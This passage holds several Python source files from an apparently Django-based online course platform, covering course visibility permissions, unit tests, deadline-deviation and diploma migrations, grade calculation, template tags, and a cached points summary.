            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='usertagging',
            unique_together=set([('tag', 'user', 'course_instance')]),
        ),
        migrations.AlterIndexTogether(
            name='usertagging',
            index_together=set([('user', 'course_instance')]),
        ),
    ]
/n/n/n/course/permissions.py/n/nfrom django.http import Http404
from django.utils.translation import ugettext_lazy as _

from authorization.permissions import (
    ACCESS,
    Permission,
    MessageMixin,
    ObjectVisibleBasePermission,
    FilterBackend,
)
from exercise.cache.points import CachedPoints
from userprofile.models import UserProfile
from .models import (
    CourseModule,
    CourseInstance,
)


class CourseVisiblePermission(ObjectVisibleBasePermission):
    message = _(""Permission denied by course visibility"")
    model = CourseInstance
    obj_var = 'instance'

    def is_object_visible(self, request, view, course):
        """"""
        Find out if CourseInstance is visible to user
        We expect that AccessModePermission is checked first

         - Always visible to course staff
         - Always hidden if not open (visible_to_students)
         - Always visible if public
         - If not public:
           - Require authentication
           - If view_access == enrolled -> visible if student of the course
           - If enrollment audience external, user should be external
           - If enrollment audience internal, user should be internal
        """"""
        # NOTE: course is actually course instance

        # Course is always visible to staff members
        if view.is_course_staff:
            return True

        # Course is not visible if it's hidden
        if not course.visible_to_students:
            self.error_msg(_(""The resource is not currently visible.""))
            return False

        user = request.user
        show_for = course.view_content_to
        VA = course.VIEW_ACCESS

        # FIXME: we probably should test if access_mode is ANONYMOUS (public), but that
        # would break api permissiosn (requires get_access_mode)
        if show_for != VA.PUBLIC:
            if not user.is_authenticated():
                self.error_msg(_(""This course is not open for public.""))
                return False

            # Handle enroll views separately
            if view.get_access_mode() == ACCESS.ENROLL:
                return self.enrollment_audience_check(request, course, user)

            if show_for == VA.ENROLLED:
                if not course.is_student(user):
                    self.error_msg(_(""Only enrolled students shall pass.""))
                    return False

            elif show_for == VA.ENROLLMENT_AUDIENCE:
                return self.enrollment_audience_check(request, course, user)

        return True

    def enrollment_audience_check(self, request, course, user):
        audience = course.enrollment_audience
        external = user.userprofile.is_external
        EA = course.ENROLLMENT_AUDIENCE
        if audience == EA.INTERNAL_USERS and external:
            self.error_msg(_(""This course is only for internal students.""))
            return False
        elif audience == EA.EXTERNAL_USERS and not external:
            self.error_msg(_(""This course is only for external students.""))
            return False
        return True


class EnrollInfoVisiblePermission(ObjectVisibleBasePermission):
    message = _(""Permission denied by course visibility"")
    model = CourseInstance
    obj_var = 'instance'

    def is_object_visible(self, request, view, course_instance):
        # Course is always visible to staff members
        if view.is_course_staff:
            return True

        # Course is not visible if it's hidden
        if not course_instance.visible_to_students:
            self.error_msg(_(""The resource is not currently visible.""))
            return False

        # Only public courses may be browsed without logging in.
        if course_instance.view_content_to != course_instance.VIEW_ACCESS.PUBLIC \
                and not request.user.is_authenticated:
            self.error_msg(_(""This course is not open for public.""))
            return False

        return True


class CourseModulePermission(MessageMixin, Permission):
    message = _(""The module is not currently visible"")

    def has_permission(self, request, view):
        if not view.is_course_staff:
            module = view.module
            return self.has_object_permission(request, view, module)
        return True

    def has_object_permission(self, request, view, module):
        if not isinstance(module, CourseModule):
            return True

        if module.status == CourseModule.STATUS.HIDDEN:
            return False

        if not module.is_after_open():
            # FIXME: use format from django settings
            self.error_msg(
                _(""The module will open for submissions at {date}.""),
                format={'date': module.opening_time},
                delim=' ',
            )
            return False

        if module.requirements.count() > 0:
            points = CachedPoints(module.course_instance, request.user, view.content)
            return module.are_requirements_passed(points)
        return True


class OnlyCourseTeacherPermission(Permission):
    message = _(""Only course teacher is allowed"")

    def has_permission(self, request, view):
        return self.has_object_permission(request, view, view.instance)

    def has_object_permission(self, request, view, obj):
        return view.is_teacher or request.user.is_superuser


class OnlyCourseStaffPermission(Permission):
    message = _(""Only course staff is allowed"")

    def has_permission(self, request, view):
        return self.has_object_permission(request, view, view.instance)

    def has_object_permission(self, request, view, obj):
        return view.is_course_staff or request.user.is_superuser


class IsCourseAdminOrUserObjIsSelf(OnlyCourseStaffPermission, FilterBackend):

    def has_object_permission(self, request, view, obj):
        if not isinstance(obj, UserProfile):
            return True

        user = request.user
        return user and (
            (user.id is not None and user.id == obj.user_id) or
            super().has_object_permission(request, view, obj)
        )

    def filter_queryset(self, request, queryset, view):
        user = request.user
        if (
            issubclass(queryset.model, UserProfile) and
            not view.is_course_staff and
            not user.is_superuser
        ):
            queryset = queryset.filter(user_id=user.id)
        return queryset
/n/n/n/course/tests.py/n/nfrom datetime import timedelta

from django.contrib.auth.models import User
from django.core.urlresolvers import reverse
from django.test import TestCase
from django.test.client import Client
from django.utils import timezone

from course.models import Course, CourseInstance, CourseHook, CourseModule, \
    LearningObjectCategory, StudentGroup
from exercise.models import BaseExercise, Submission
from exercise.exercise_models import LearningObject


class CourseTest(TestCase):
    def setUp(self):
        self.client = Client()

        self.user = User(username=""testUser"")
        self.user.set_password(""testPassword"")
        self.user.save()

        self.grader = User(username=""grader"", is_staff=True)
        self.grader.set_password(""graderPassword"")
        self.grader.save()

        self.superuser = User(username=""staff"", is_staff=False, is_superuser=True)
        self.superuser.set_password(""staffPassword"")
        self.superuser.save()

        self.course = Course.objects.create(
            name=""test course"",
            code=""123456"",
            url=""Course-Url""
        )

        self.today = timezone.now()
        self.tomorrow = self.today + timedelta(days=1)
        self.two_days_from_now = self.tomorrow + timedelta(days=1)
        self.yesterday = self.today - timedelta(days=1)

        self.past_course_instance = CourseInstance.objects.create(
            instance_name=""Fall 2011 day 0"",
            starting_time=self.yesterday,
            ending_time=self.today,
            course=self.course,
            url=""T-00.1000_d0""
        )

        self.current_course_instance = CourseInstance.objects.create(
            instance_name=""Fall 2011 day 1"",
            starting_time=self.today,
            ending_time=self.tomorrow,
            course=self.course,
            url=""T-00.1000_d1""
        )

        self.future_course_instance = CourseInstance.objects.create(
            instance_name=""Fall 2011 day 2"",
            starting_time=self.tomorrow,
            ending_time=self.two_days_from_now,
            course=self.course,
            url=""T-00.1000_d2""
        )

        self.hidden_course_instance = CourseInstance.objects.create(
            instance_name=""Secret super course"",
            starting_time=self.tomorrow,
            ending_time=self.two_days_from_now,
            course=self.course,
            url=""T-00.1000_hidden"",
            visible_to_students=False
        )

        self.course_module = CourseModule.objects.create(
            name=""test module"",
            url=""test-module"",
            points_to_pass=10,
            course_instance=self.current_course_instance,
            opening_time=self.today,
            closing_time=self.tomorrow
        )

        self.course_module_with_late_submissions_allowed = CourseModule.objects.create(
            name=""test module"",
            url=""test-module-late"",
            points_to_pass=50,
            course_instance=self.current_course_instance,
            opening_time=self.today,
            closing_time=self.tomorrow,
            late_submissions_allowed=True,
            late_submission_deadline=self.two_days_from_now,
            late_submission_penalty=0.2
        )

        self.learning_object_category = LearningObjectCategory.objects.create(
            name=""test category"",
            course_instance=self.current_course_instance,
            points_to_pass=5
        )

        #self.hidden_learning_object_category = LearningObjectCategory.objects.create(
        #    name=""hidden category"",
        #    course_instance=self.current_course_instance
        #)
        #self.hidden_learning_object_category.hidden_to.add(self.user.userprofile)

        self.learning_object = LearningObject.objects.create(
            name=""test learning object"",
            course_module=self.course_module,
            category=self.learning_object_category,
            url='l1',
        )

        self.broken_learning_object = LearningObject.objects.create(
            name=""test learning object"",
            course_module=self.course_module_with_late_submissions_allowed,
            category=self.learning_object_category,
            url='l2',
        )

        self.base_exercise = BaseExercise.objects.create(
            name=""test exercise"",
            course_module=self.course_module,
            category=self.learning_object_category,
            service_url=""http://localhost/"",
            url='b1',
        )

        self.submission = Submission.objects.create(
            exercise=self.base_exercise,
            grader=self.grader.userprofile
        )
        self.submission.submitters.add(self.user.userprofile)

        self.course_hook = CourseHook.objects.create(
            hook_url=""test_hook_url"",
            course_instance=self.current_course_instance
        )

    def test_course_instance_open(self):
        self.assertFalse(self.past_course_instance.is_open())
        self.assertTrue(self.current_course_instance.is_open())
        self.assertFalse(self.future_course_instance.is_open())

    def test_course_url(self):
        self.assertEqual(""/Course-Url/T-00.1000_d1/"", self.current_course_instance.get_absolute_url())
        self.assertEqual(""/Course-Url/T-00.1000_hidden/"", self.hidden_course_instance.get_absolute_url())

    def test_course_staff(self):
        self.assertFalse(self.course.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_assistant(self.user))
        self.assertFalse(self.current_course_instance.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(0, len(self.current_course_instance.get_course_staff_profiles()))

        self.current_course_instance.assistants.add(self.user.userprofile)

        self.assertFalse(self.course.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_assistant(self.user))
        self.assertFalse(self.current_course_instance.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))

        self.course.teachers.add(self.user.userprofile)

        self.assertTrue(self.course.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_assistant(self.user))
        self.assertTrue(self.current_course_instance.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))
        self.assertEquals(""testUser"", self.current_course_instance.get_course_staff_profiles()[0].shortname)

        self.current_course_instance.assistants.clear()

        self.assertTrue(self.course.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_assistant(self.user))
        self.assertTrue(self.current_course_instance.is_teacher(self.user))
        self.assertTrue(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(1, len(self.current_course_instance.get_course_staff_profiles()))

        self.course.teachers.clear()

        self.assertFalse(self.course.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_assistant(self.user))
        self.assertFalse(self.current_course_instance.is_teacher(self.user))
        self.assertFalse(self.current_course_instance.is_course_staff(self.user))
        self.assertEquals(0, len(self.current_course_instance.get_course_staff_profiles()))

    def test_course_instance_submitters(self):
        students = self.current_course_instance.get_submitted_profiles()
        self.assertEquals(1, len(students))
        self.assertEquals(""testUser"", students[0].shortname)

        submission2 = Submission.objects.create(
            exercise=self.base_exercise,
            grader=self.grader.userprofile)
        submission2.submitters.add(self.user.userprofile)

        students = self.current_course_instance.get_submitted_profiles()
        self.assertEquals(1, len(students))
        self.assertEquals(""testUser"", students[0].shortname)

        submission3 = Submission.objects.create(
            exercise=self.base_exercise,
            grader=self.user.userprofile)
        submission3.submitters.add(self.grader.userprofile)

        students = self.current_course_instance.get_submitted_profiles()
        self.assertEquals(2, len(students))
        self.assertEquals(""testUser"", students[0].shortname)
        self.assertEquals(""grader"", students[1].shortname)

    def test_course_instance_visibility(self):
        self.assertTrue(self.current_course_instance.is_visible_to())
        self.assertFalse(self.hidden_course_instance.is_visible_to())
        self.assertTrue(self.current_course_instance.is_visible_to(self.user))
        self.assertFalse(self.hidden_course_instance.is_visible_to(self.user))
        self.assertTrue(self.current_course_instance.is_visible_to(self.superuser))
        self.assertTrue(self.hidden_course_instance.is_visible_to(self.superuser))

    def test_course_instance_get_visible(self):
        open_course_instances = CourseInstance.objects.get_visible()
        self.assertEqual(3, len(open_course_instances))
        self.assertTrue(self.current_course_instance in open_course_instances)
        self.assertTrue(self.future_course_instance in open_course_instances)

        open_course_instances = CourseInstance.objects.get_visible(self.user)
        self.assertEqual(3, len(open_course_instances))
        self.assertTrue(self.current_course_instance in open_course_instances)
        self.assertTrue(self.future_course_instance in open_course_instances)

        open_course_instances = CourseInstance.objects.get_visible(self.superuser)
        self.assertEqual(4, len(open_course_instances))
        self.assertTrue(self.current_course_instance in open_course_instances)
        self.assertTrue(self.future_course_instance in open_course_instances)
        self.assertTrue(self.hidden_course_instance in open_course_instances)

    def test_course_instance_unicode_string(self):
        self.assertEquals(""123456 test course: Fall 2011 day 1"", str(self.current_course_instance))
        self.assertEquals(""123456 test course: Secret super course"", str(self.hidden_course_instance))

    def test_course_hook_unicode_string(self):
        self.assertEquals(""123456 test course: Fall 2011 day 1 -> test_hook_url"", str(self.course_hook))

    def test_course_module_late_submission_point_worth(self):
        self.assertEquals(0, self.course_module.get_late_submission_point_worth())
        self.assertEquals(80, self.course_module_with_late_submissions_allowed.get_late_submission_point_worth())

    def test_course_module_open(self):
        self.assertFalse(self.course_module.is_open(self.yesterday))
        self.assertTrue(self.course_module.is_open(self.today))
        self.assertTrue(self.course_module.is_open())
        self.assertTrue(self.course_module.is_open(self.tomorrow))
        self.assertFalse(self.course_module.is_open(self.two_days_from_now))

    def test_course_module_after_open(self):
        self.assertFalse(self.course_module.is_after_open(self.yesterday))
        self.assertTrue(self.course_module.is_after_open(self.today))
        self.assertTrue(self.course_module.is_after_open())
        self.assertTrue(self.course_module.is_after_open(self.tomorrow))
        self.assertTrue(self.course_module.is_after_open(self.two_days_from_now))

    def test_course_views(self):
        response = self.client.get('/no_course/test', follow=True)
        self.assertEqual(response.status_code, 404)
        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)
        self.assertTrue(response.redirect_chain)
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, 'userprofile/login.html')

        self.client.login(username=""testUser"", password=""testPassword"")
        response = self.client.get('/no_course/test', follow=True)
        self.assertEqual(response.status_code, 404)
        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)
        self.assertEqual(response.status_code, 200)

        self.assertEqual(response.context[""course""], self.course)
        self.assertEqual(response.context[""instance""], self.current_course_instance)
        self.assertFalse(response.context[""is_assistant""])
        self.assertFalse(response.context[""is_teacher""])

        response = self.client.get(self.hidden_course_instance.get_absolute_url(), follow=True)
        self.assertEqual(response.status_code, 403)

    def test_course_teacher_views(self):
        url = self.current_course_instance.get_edit_url()
        response = self.client.get(url)
        self.assertEqual(response.status_code, 302)

        self.client.login(username=""testUser"", password=""testPassword"")
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)

        self.current_course_instance.assistants.add(self.grader.userprofile)
        self.client.login(username=""grader"", password=""graderPassword"")
        response = self.client.get(url)
        self.assertEqual(response.status_code, 403)
        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.context[""is_assistant""])
        self.assertFalse(response.context[""is_teacher""])

        self.current_course_instance.assistants.clear()
        self.course.teachers.add(self.grader.userprofile)
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        response = self.client.get(self.current_course_instance.get_absolute_url(), follow=True)
        self.assertEqual(response.status_code, 200)
        self.assertFalse(response.context[""is_assistant""])
        self.assertTrue(response.context[""is_teacher""])

        self.client.logout()
        response = self.client.get(url)
        self.assertEqual(response.status_code, 302)

        self.client.login(username=""staff"", password=""staffPassword"")
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.assertFalse(response.context[""is_assistant""])
        self.assertTrue(response.context[""is_teacher""])

    def test_groups(self):
        group = StudentGroup(course_instance=self.current_course_instance)
        group.save()
        group.members.add(self.user.userprofile,self.grader.userprofile)
        self.assertEqual(StudentGroup.get_exact(self.current_course_instance,
            [self.user.userprofile,self.grader.userprofile]), group)
        self.assertEqual(StudentGroup.get_exact(self.current_course_instance,
            [self.user.userprofile,self.superuser.userprofile]), None)
/n/n/n/deviations/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0006_auto_20150625_1823'),
        ('userprofile', '0002_auto_20150427_1717'),
    ]

    state_operations = [
        migrations.CreateModel(
            name='DeadlineRuleDeviation',
            fields=[
                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),
                ('extra_minutes', models.IntegerField()),
                ('exercise', models.ForeignKey(to='exercise.BaseExercise')),
                ('submitter', models.ForeignKey(to='userprofile.UserProfile')),
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='MaxSubmissionsRuleDeviation',
            fields=[
                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),
                ('extra_submissions', models.IntegerField()),
                ('exercise', models.ForeignKey(to='exercise.BaseExercise')),
                ('submitter', models.ForeignKey(to='userprofile.UserProfile')),
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
        migrations.AlterUniqueTogether(
            name='maxsubmissionsruledeviation',
            unique_together=set([('exercise', 'submitter')]),
        ),
        migrations.AlterUniqueTogether(
            name='deadlineruledeviation',
            unique_together=set([('exercise', 'submitter')]),
        ),
    ]
    
    operations = [
        migrations.SeparateDatabaseAndState(state_operations=state_operations)
    ]
/n/n/n/diploma/grade.py/n/nfrom copy import copy


def calculate_grade(total_points, point_limits, pad_points):
    points = total_points['points']
    d_points = copy(total_points['points_by_difficulty'])

    def pass_limit(bound):
        if isinstance(bound, list):
            ds,ls = zip(*bound)
            for i,d in enumerate(ds):

                if pad_points:
                    p = d_points.get(d, 0)
                    l = ls[i]
                    if p < l:
                        for j in range(i + 1, len(ds)):
                            jd = ds[j]
                            jp = d_points.get(jd, 0)
                            if jp > l - p:
                                d_points[jd] -= l - p
                                d_points[d] = l
                                break
                            else:
                                p += jp
                                d_points[d] = p
                                d_points[jd] = 0
                    else:
                        continue

                if d_points.get(d, 0) < ls[i]:
                    return False

            return True
        else:
            return points >= bound

    grade = 0
    for bound in point_limits:
        if pass_limit(bound):
            grade += 1
        else:
            break
    return grade


def assign_grade(cached_points, diploma_design):

    if not (diploma_design and cached_points.user.is_authenticated()):
        return -1

    if not diploma_design.course.is_course_staff(cached_points.user):
        avail = diploma_design.availability
        opt = diploma_design.USERGROUP
        external = cached_points.user.userprofile.is_external
        if (
            (avail == opt.EXTERNAL_USERS and not external)
            or (avail == opt.INTERNAL_USERS and external)
        ):
            return -1

    def is_passed(model):
        entry,_,_,_ = cached_points.find(model)
        return entry['passed']
    if not all(is_passed(m) for m in diploma_design.modules_to_pass.all()):
        return 0
    if not all(is_passed(e) for e in diploma_design.exercises_to_pass.all()):
        return 0

    return calculate_grade(
        cached_points.total(),
        diploma_design.point_limits,
        diploma_design.pad_points
    )
/n/n/n/diploma/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.db.models.deletion
import diploma.models
import lib.models
import lib.fields


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0024_auto_20160919_1951'),
        ('course', '0030_auto_20160912_1341'),
        ('userprofile', '0003_auto_20160728_1139'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseDiplomaDesign',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('logo', models.ImageField(null=True, blank=True, upload_to=diploma.models.build_upload_dir)),
                ('title', models.TextField(blank=True)),
                ('body', models.TextField(blank=True)),
                ('date', models.CharField(max_length=256)),
                ('signature_name', models.CharField(blank=True, max_length=256)),
                ('signature_title', models.CharField(blank=True, max_length=256)),
                ('small_print', models.TextField(blank=True)),
                ('point_limits', lib.fields.JSONField(blank=True, help_text='A list of length 5 where each element is the required points for n:th grade.The element can be a list of 2-tuples [[difficulty_level_a, points],[difficulty_level_b, points]].')),
                ('pad_points', models.BooleanField(help_text='If difficulty levels are used the lower level can be padded with higher level points.', default=False)),
                ('course', models.OneToOneField(on_delete=django.db.models.deletion.SET_NULL, to='course.CourseInstance', null=True)),
                ('exercises_to_pass', models.ManyToManyField(blank=True, to='exercise.BaseExercise')),
                ('modules_to_pass', models.ManyToManyField(blank=True, to='course.CourseModule')),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='StudentDiploma',
            fields=[
                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),
                ('created', models.DateTimeField(auto_now=True)),
                ('hashkey', models.CharField(unique=True, max_length=32)),
                ('name', models.CharField(max_length=255)),
                ('grade', models.PositiveIntegerField(default=0)),
                ('design', models.ForeignKey(to='diploma.CourseDiplomaDesign')),
                ('profile', models.ForeignKey(on_delete=django.db.models.deletion.SET_NULL, to='userprofile.UserProfile', null=True)),
            ],
            options={
            },
            bases=(lib.models.UrlMixin, models.Model),
        ),
    ]
/n/n/n/diploma/templatetags/diploma.py/n/nfrom django import template
from django.core.urlresolvers import reverse

from exercise.templatetags.exercise import _prepare_context
from ..grade import assign_grade
from ..models import CourseDiplomaDesign


register = template.Library()


@register.inclusion_tag(""diploma/_diploma_button.html"", takes_context=True)
def diploma_button(context, student=None):
    points = _prepare_context(context, student)
    design = CourseDiplomaDesign.objects.filter(course=points.instance).first()
    url = None
    if design and points.user.is_authenticated():
        url = reverse('diploma-create', kwargs={
            'coursediploma_id': design.id,
            'userprofile_id': points.user.userprofile.id,
        })
    return {
        'grade': assign_grade(points, design),
        'url': url,
        'is_course_staff': context.get('is_course_staff'),
    }
/n/n/n/edit_course/templatetags/editcourse.py/n/nfrom django import template
from django.core.urlresolvers import reverse

from course.models import CourseInstance


register = template.Library()


def _normal_kwargs(instance, model_name, **extra_kwargs):
    kwargs = instance.get_url_kwargs()
    kwargs.update({
        ""model"": model_name,
    })
    kwargs.update(extra_kwargs)
    return kwargs


@register.filter
def editurl(model_object, model_name):
    return reverse('model-edit', kwargs=_normal_kwargs(
        model_object.course_instance,
        model_name,
        id=model_object.id,
    ))


@register.filter
def removeurl(model_object, model_name):
    return reverse('model-remove', kwargs=_normal_kwargs(
        model_object.course_instance,
        model_name,
        id=model_object.id,
    ))


@register.filter
def createurl(model_object, model_name):
    type_name = None
    if "","" in model_name:
        model_name, type_name = model_name.split("","", 1)
    if isinstance(model_object, CourseInstance):
        return reverse('model-create', kwargs=_normal_kwargs(
            model_object,
            model_name,
        ))
    if type_name:
        return reverse('model-create-type-for', kwargs=_normal_kwargs(
            model_object.course_instance,
            model_name,
            parent_id=model_object.id,
            type=type_name,
        ))
    return reverse('model-create-for', kwargs=_normal_kwargs(
        model_object.course_instance,
        model_name,
        parent_id=model_object.id,
    ))
/n/n/n/exercise/cache/points.py/n/nfrom copy import deepcopy
from django.db.models.signals import post_save, post_delete, m2m_changed
from django.utils import timezone

from lib.cache import CachedAbstract
from notification.models import Notification
from ..models import LearningObject, Submission
from .hierarchy import ContentMixin


class CachedPoints(ContentMixin, CachedAbstract):
    KEY_PREFIX = 'points'

    def __init__(self, course_instance, user, content):
        self.content = content
        self.instance = course_instance
        self.user = user
        super().__init__(course_instance, user)

    def _needs_generation(self, data):
        return data is None or data['created'] < self.content.created()

    def _generate_data(self, instance, user, data=None):
        data = deepcopy(self.content.data)
        module_index = data['module_index']
        exercise_index = data['exercise_index']
        modules = data['modules']
        categories = data['categories']
        total = data['total']

        # Augment submission parameters.
        def r_augment(children):
            for entry in children:
                if entry['submittable']:
                    entry.update({
                        'submission_count': 0,
                        'submissions': [],
                        'best_submission': None,
                        'points': 0,
                        'passed': entry['points_to_pass'] == 0,
                        'graded': False,
                        'unofficial': False,
                    })
                r_augment(entry.get('children'))
        for module in modules:
            module.update({
                'submission_count': 0,
                'points': 0,
                'points_by_difficulty': {},
                'unconfirmed_points_by_difficulty': {},
                'passed': module['points_to_pass'] == 0,
            })
            r_augment(module['children'])
        for entry in categories.values():
            entry.update({
                'submission_count': 0,
                'points': 0,
                'points_by_difficulty': {},
                'unconfirmed_points_by_difficulty': {},
                'passed': entry['points_to_pass'] == 0,
            })
        total.update({
            'submission_count': 0,
            'points': 0,
            'points_by_difficulty': {},
            'unconfirmed_points_by_difficulty': {},
        })

        # Augment submission data.
        if user.is_authenticated():
            submissions = (
                user.userprofile.submissions.exclude_errors()
                .filter(exercise__course_module__course_instance=instance)
                .prefetch_related('exercise')
                .only('id', 'exercise', 'submission_time', 'status', 'grade')
            )
            for submission in submissions:
                try:
                    tree = self._by_idx(modules, exercise_index[submission.exercise.id])
                except KeyError:
                    self.dirty = True
                    continue
                entry = tree[-1]
                entry['submission_count'] += 1 if not submission.status in (Submission.STATUS.ERROR, Submission.STATUS.UNOFFICIAL) else 0
                unofficial = submission.status == Submission.STATUS.UNOFFICIAL
                entry['submissions'].append({
                    'id': submission.id,
                    'max_points': entry['max_points'],
                    'points_to_pass': entry['points_to_pass'],
                    'confirm_the_level': entry.get('confirm_the_level', False),
                    'submission_count': 1, # to fool points badge
                    'points': submission.grade,
                    'graded': submission.is_graded,
                    'passed': submission.grade >= entry['points_to_pass'],
                    'submission_status': submission.status if not submission.is_graded else False,
                    'unofficial': unofficial,
                    'date': submission.submission_time,
                    'url': submission.get_url('submission-plain'),
                })
                if (
                    submission.status == Submission.STATUS.READY and (
                        entry['unofficial']
                        or submission.grade >= entry['points']
                    )
                ) or (
                    unofficial and (
                        not entry['graded']
                        or (entry['unofficial'] and submission.grade > entry['points'])
                    )
                ):
                    entry.update({
                        'best_submission': submission.id,
                        'points': submission.grade,
                        'passed': not unofficial and submission.grade >= entry['points_to_pass'],
                        'graded': submission.status == Submission.STATUS.READY,
                        'unofficial': unofficial,
                    })
                if submission.notifications.count() > 0:
                    entry['notified'] = True
                    if submission.notifications.filter(seen=False).count() > 0:
                        entry['unseen'] = True

        # Confirm points.
        def r_check(parent, children):
            for entry in children:
                if (
                    entry['submittable']
                    and entry['confirm_the_level']
                    and entry['passed']
                ):
                    if 'unconfirmed' in parent:
                        del(parent['unconfirmed'])
                    for child in parent.get('children', []):
                        if 'unconfirmed' in child:
                            del(child['unconfirmed'])
                r_check(entry, entry.get('children', []))
        for module in modules:
            r_check(module, module['children'])

        # Collect points and check limits.
        def add_to(target, entry):
            target['submission_count'] += entry['submission_count']
            if entry.get('unofficial', False):
                pass
            elif entry.get('unconfirmed', False):
                self._add_by_difficulty(
                    target['unconfirmed_points_by_difficulty'],
                    entry['difficulty'],
                    entry['points']
                )
            else:
                target['points'] += entry['points']
                self._add_by_difficulty(
                    target['points_by_difficulty'],
                    entry['difficulty'],
                    entry['points']
                )
        def r_collect(module, parent, children):
            passed = True
            max_points = 0
            submissions = 0
            points = 0
            confirm_entry = None
            for entry in children:
                if entry['submittable']:
                    if entry['confirm_the_level']:
                        confirm_entry = entry
                    else:
                        passed = passed and entry['passed']
                        max_points += entry['max_points']
                        submissions += entry['submission_count']
                        if entry['graded']:
                            points += entry['points']
                            add_to(module, entry)
                            add_to(categories[entry['category_id']], entry)
                            add_to(total, entry)
                passed = (
                    r_collect(module, entry, entry.get('children', []))
                    and passed
                )
            if confirm_entry and submissions > 0:
                confirm_entry['confirmable_points'] = True
            if parent and not parent['submittable']:
                parent['max_points'] = max_points
                parent['submission_count'] = submissions
                parent['points'] = points
            return passed
        for module in modules:
            passed = r_collect(module, None, module['children'])
            module['passed'] = (
                passed
                and module['points'] >= module['points_to_pass']
            )
        for category in categories.values():
            category['passed'] = (
                category['points'] >= category['points_to_pass']
            )

        data['points_created'] = timezone.now()
        return data

    def created(self):
        return self.data['points_created'], super().created()

    def submission_ids(self, number=None, category_id=None, module_id=None,
                       exercise_id=None, filter_for_assistant=False, best=True):
        exercises = self.search_exercises(
            number=number,
            category_id=category_id,
            module_id=module_id,
            exercise_id=exercise_id,
            filter_for_assistant=filter_for_assistant,
        )
        submissions = []
        if best:
            for entry in exercises:
                sid = entry.get('best_submission', None)
                if not sid is None:
                    submissions.append(sid)
        else:
            for entry in exercises:
                submissions.extend(s['id'] for s in entry.get('submissions', []))
        return submissions


def invalidate_content(sender, instance, **kwargs):
    course = instance.exercise.course_instance
    for profile in instance.submitters.all():
        CachedPoints.invalidate(course, profile.user)

def invalidate_content_m2m(sender, instance, action, reverse, model, pk_set, **kwargs):
    # many-to-many field Submission.submitters may be modified without
    # triggering the Submission post save hook
    if action not in ('post_add', 'pre_remove'):
        return
    if reverse:
        # instance is a UserProfile
        if model == Submission:
            seen_courses = set()
            for submission_pk in pk_set:
                try:
                    submission = Submission.objects.get(pk=submission_pk)
                    course_instance = submission.exercise.course_instance
                    if course_instance.pk not in seen_courses:
                        CachedPoints.invalidate(course_instance, instance.user)
                    else:
                        seen_courses.add(course_instance.pk)
                except Submission.DoesNotExist:
                    pass
    else:
        # instance is a Submission
        invalidate_content(Submission, instance)

def invalidate_notification(sender, instance, **kwargs):
    course = instance.course_instance
    if not course and instance.submission:
        course = instance.submission.exercise.course_instance
    CachedPoints.invalidate(course, instance.recipient.user)


# Automatically invalidate cached points when submissions change.
post_save.connect(invalidate_content, sender=Submission)
post_delete.connect(invalidate_content, sender=Submission)
post_save.connect(invalidate_notification, sender=Notification)
post_delete.connect(invalidate_notification, sender=Notification)
# listen to the m2m_changed signal since submission.submitters is a many-to-many
# field and instances must be saved before the many-to-many fields may be modified,
# that is to say, the submission post save hook may see an empty submitters list
m2m_changed.connect(invalidate_content_m2m, sender=Submission.submitters.through)
/n/n/n/exercise/exercise_summary.py/n/nimport itertools

from django.core.exceptions import ObjectDoesNotExist
from django.db.models import Max

from course.models import StudentGroup
from .cache.content import CachedContent
from .models import BaseExercise, Submission


class UserExerciseSummary(object):
    """"""
    UserExerciseSummary summarises the submissions of a certain user and
    exercise. It calculates some characterizing figures such as the number of
    submissions and reference to the best submission. See the public methods
    for more.
    """"""
    def __init__(self, exercise, user=None):
        self.exercise = exercise
        self.max_points = getattr(exercise, 'max_points', 0)
        self.difficulty = getattr(exercise, 'difficulty', '')
        self.points_to_pass = getattr(exercise, 'points_to_pass', 0)
        self.user = user
        self.submissions = []
        self.submission_count = 0
        self.best_submission = None
        self.graded = False
        self.unofficial = False

        if self.user and self.user.is_authenticated():
            self.submissions = list(exercise.get_submissions_for_student(
                user.userprofile))
            for s in self.submissions:
                if not s.status in (
                    Submission.STATUS.ERROR,
                    Submission.STATUS.REJECTED,
                ):
                    self.submission_count += 1
                    if (
                        s.status == Submission.STATUS.READY and (
                            self.best_submission is None
                            or self.unofficial
                            or s.grade > self.best_submission.grade
                        )
                    ):
                        self.best_submission = s
                        self.unofficial = False
                        self.graded = True
                    elif (
                        s.status == Submission.STATUS.UNOFFICIAL and (
                            not self.graded
                            or (
